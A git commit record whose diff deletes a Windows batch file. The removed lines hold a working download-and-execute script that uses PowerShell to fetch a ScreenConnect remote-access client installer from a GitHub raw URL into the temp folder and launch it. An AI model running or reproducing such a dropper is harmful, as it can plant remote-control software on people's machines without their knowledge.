affdb67930ff38c350c7e4bc423e79a815e5444c
dm-ship-it-dev <dm7430980@gmail.com>
2025-11-15 23:31:12 +0100

    Delete download-and-execute (1) - Copy.bat

--- download-and-execute (1) - Copy.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-
-set files='https://github.com/dm-ship-it-dev/my-files/raw/refs/heads/main/ScreenConnect.ClientSetup(2).msi'
-powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
-
-
-
